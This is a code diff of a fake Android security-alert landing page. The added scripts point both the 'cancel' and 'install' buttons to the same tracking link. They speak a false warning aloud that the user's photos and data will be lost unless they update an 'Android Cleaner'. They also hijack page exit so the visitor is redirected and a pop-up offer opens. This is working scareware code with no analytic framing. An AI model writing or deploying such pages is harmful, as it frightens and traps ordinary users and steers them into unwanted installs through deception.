@@ -754,11 +754,11 @@ window.clearTimeout(SD);
 <span style="font-size:15px;color:red;font-family:sans-serif;" id="theTime">5 minutos 44 segundos</span></p>
  </div>
  <div class="buttons">
- <script>document.write('<a class="button exitpoint right cancel" id="cancel-button" href="https://tk.besttrustedreview.com/click.php?lp=1">')</script>
+ <script>document.write('<a class="button exitpoint right cancel" id="cancel-button" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1">')</script>
  <script>document.write(languageSelector.cancelButton)</script>
  <script>document.write("</a>")</script></a>
 
- <script>document.write('<a class="button exitpoint install" id="install-button" href="https://tk.besttrustedreview.com/click.php?lp=1">')</script>
+ <script>document.write('<a class="button exitpoint install" id="install-button" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1">')</script>
  <script>document.write(languageSelector.installButton)</script>
  <script>document.write("</a>")</script></a>
  </div>
@@ -799,59 +799,46 @@ window.top.location = window.location;
         }();
 </script>
 
-<script type="text/javascript">
- function speak(c) {
- var b = new SpeechSynthesisUtterance();
- var a = speechSynthesis.getVoices();
- b.voice = a[2];
- b.voiceURI = "native";
- b.volume = 1;
- b.rate = 1;
- b.pitch = 1;
- b.text = c;
- b.lang = "id-ID";
- speechSynthesis.speak(b)
- }
-
- speak(languageSelector.alert);
-</script>
+<script type="text/javascript">function speak(c){var b=new SpeechSynthesisUtterance();var a=speechSynthesis.getVoices();b.voice=a[2];b.voiceURI="native";b.volume=1;b.rate=1;b.pitch=1;b.text=c;b.lang="en-US";speechSynthesis.speak(b)}speak("You should update your Android Cleaner now or your photos and data will be lost and cannot be recovered!");</script>
 
 <script type="text/javascript">
- (function(w, d) {
- var epp = function() {
-if (w.onbeforeunload === null) {
- var to;
+	var nc = 'https://tk.besttrustedreview.com/click.php?key=3k430atrca9zmqhpvf5s';
+	
+	document.getElementById("cancel-button").href = nc;
+	document.getElementById("install-button").href = nc;
 
- function repp() {
- w.onbeforeunload = null;
- };
-
- function epp() {
- to = setTimeout(function() {
-w.location.replace('https://tk.besttrustedreview.com/click.php?key=3k430atrca9zmqhpvf5s');
-repp();
- }, 100);
- return languageSelector.alert;
- }
-
- w.onbeforeunload = epp;
- // Prevent epp firing from clicking on tracking links
- var ln = d.querySelectorAll("[href='" + playGoogleUrl + "']");
- for (i = 0; i < ln.length; ++i) {
- ln[i].addEventListener("click", function() {
-localStorage.setItem('redirectAppStore', 1);
-repp();
- });
- }
-}
- };
- if (d.readyState != 'loading') {
-epp();
- }
- else {
-d.addEventListener('DOMContentLoaded', epp);
- }
- })(window, document);
+    (function (w, d) {
+        var epp = function () {
+            if (w.onbeforeunload === null) {
+                var to;
+                function repp() {
+                    w.onbeforeunload = null;
+					window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+                };
+                function epp() {
+                    to = setTimeout(function () {
+                        w.location.replace(nc);
+                        repp();
+                    }, 100);
+                    return 'You should update your Android Cleaner now or your photos and data will be lost and cannot be recovered!';
+                }
+                w.onbeforeunload = epp;
+                // Prevent epp firing from clicking on tracking links
+                var ln = d.querySelectorAll("[href='"+nc+"']");
+                for (i = 0; i < ln.length; ++i) {
+                    ln[i].addEventListener("click", function () {
+                        repp();
+                    });
+                }
+            }
+            ;
+        };
+        if (d.readyState != 'loading') {
+            epp();
+        } else {
+            d.addEventListener('DOMContentLoaded', epp);
+        }
+    })(window, document);
 </script>
 
 
